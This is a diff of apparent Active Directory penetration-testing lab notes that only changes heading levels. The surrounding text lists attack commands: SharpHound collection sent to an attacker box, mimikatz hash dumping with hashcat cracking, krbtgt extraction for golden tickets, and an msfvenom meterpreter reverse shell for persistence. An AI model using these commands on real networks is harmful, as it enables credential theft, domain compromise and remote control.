@@ -12,9 +12,7 @@
 6 Maintaining Access
 ```
 
-## Examples
-
-### Enumeration with Powerview
+## Enumeration with Powerview
 
 ssh into machine:
 
@@ -81,7 +79,7 @@ Enumerate operating systems running inside the network:
     Windows 10 Enterprise Evaluation 10.0 (18363)
     Windows 10 Enterprise Evaluation 10.0 (18363)
 
-### Enumeration with Bloodhound
+## Enumeration with Bloodhound
 
     powershell -ep bypass 
     . .\Downloads\SharpHound.ps1
@@ -89,20 +87,20 @@ Enumerate operating systems running inside the network:
 
 Transfer the loot to attackerbox and load in bloodhound. Map the network.
 
-### Dumping hashes with mimikatz
+## Dumping hashes with mimikatz
 
     cd Downloads && mimikatz.exe
     privilege::debug
     lsadump::lsa /patch
     hashcat -m 1000 <hash.text> usr/share/wordlists/rockyou.txt
 
-### Golden ticket attacks with mimikatz
+## Golden ticket attacks with mimikatz
 
     cd Downloads && mimikatz.exe
     privilege::debug
     lsadump::lsa /inject /name:krbtgt
 
-### Maintaining Access
+## Maintaining Access
 
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
 
